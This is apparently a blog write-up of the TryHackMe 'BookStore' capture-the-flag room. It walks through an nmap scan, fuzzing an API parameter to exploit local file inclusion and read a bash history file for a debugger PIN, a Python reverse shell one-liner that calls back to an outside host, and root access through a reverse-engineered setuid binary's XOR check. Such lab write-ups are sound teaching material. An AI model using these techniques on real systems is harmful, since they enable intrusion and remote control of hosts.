---
title: "BookStore - TryHackMe"
date: "2020-12-20"
categories: 
  - "tryhackme"
---

write-up for Tryhackme room [bookstore](https://tryhackme.com/room/bookstoreoc)

Difficulty Level - Medium

Start with Nmap scan

```
nmap -A -oN initial 10.10.193.97
```

![](/Images/bookstore/Screenshot-2020-12-20-145007.png)

then run gobuster on all ports

![](/Images/bookstore/Screenshot-2020-12-20-150441.png)

![](/Images/bookstore/Screenshot-2020-12-20-150509.png)

go though the website and find the hidden hint, some are inside source view, which are

```
<!--Still Working on this page will add the backend support soon, also the debugger pin is inside sid's bash history file -->


//the previous version of the api had a paramter which lead to local file inclusion vulnerability, glad we now have the new version which is secure.
```

So now we are aware of **"/api/v1**" vulnerable to LFI if we can read **.bash\_history** we can get PIN

i try with "**id**" parameter it didn't work so need to FUZZ the parameter.

```
wfuzz -u http://10.10.193.97:5000/api/v1/resources/books\?FUZZ\=.bash_history -w /usr/share/dirbuster/wordlists/directory-list-2.3-medium.txt --hc 404
```

![](/Images/bookstore/Screenshot-2020-12-20-115336.png)

with "**show**" parameter we can read the file.

![](/Images/bookstore/Screenshot-2020-12-20-144319-1024x39.png)

we got the PIN now we can unlock the console with is in port 5000, after unlock console we can get reverse shell.

![](/Images/bookstore/Screenshot-2020-12-20-151516-1024x123.png)

it is python interactive console you can use any python reverse shell code to get shell, you can find more command [here](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Reverse%20Shell%20Cheatsheet.md).

```
import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.0.0.1",4242));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn("/bin/bash")
```

## Privilege Escalation

we can see a binary in current folder also it is owned by root, if we can execute it without error can get root easily but problem is we don't know anything about it so download it to your local PC and analysis it using "**Ghidra**". if you don't have much knowledge about you can learn [here](https://tryhackme.com/room/ccghidra).

![](/Images/bookstore/Screenshot-2020-12-20-143626-1024x584.png)

This is the most important detail about binary

```
void main(void)

{
  long in_FS_OFFSET;
  uint local_1c;
  uint local_18;
  uint local_14;
  long local_10;
  
  local_10 = *(long *)(in_FS_OFFSET + 0x28);
  setuid(0);
  local_18 = 0x5db3;
  puts("What\'s The Magic Number?!");
  __isoc99_scanf(&DAT_001008ee,&local_1c);
  local_14 = local_1c ^ 0x1116 ^ local_18;
  if (local_14 == 0x5dcd21f4) {
    system("/bin/bash -p");
  }
  else {
    puts("Incorrect Try Harder");
  }
  if (local_10 != *(long *)(in_FS_OFFSET + 0x28)) {
                    /* WARNING: Subroutine does not return */
    __stack_chk_fail();
  }
  return;
}
```

there are some hexadecimal we need to convert into decimal, you can do it [here](https://www.rapidtables.com/convert/number/hex-to-decimal.html).

```
local_14 = 0x5dcd21f4      =  1573724660
local_18 = 0x5db3          =  23987
         = 0x1116          =  4374

local_14 = local_1c ^ 0x1116 ^ 0x5db3
```

if I'm correct we need to find the "**local\_1c**" **XOR** value, now we have all the details to calculate, you can calculate this with Programming feature in most of the Calculator

![](/Images/bookstore/Screenshot-2020-12-20-143902.png)

we get the following Answer.

![](/Images/bookstore/Screenshot-2020-12-20-153932.png)

lets execute binary and get root

![](/Images/bookstore/Screenshot-2020-12-20-143411.png)

Finally Root!!

Happy Hacking.
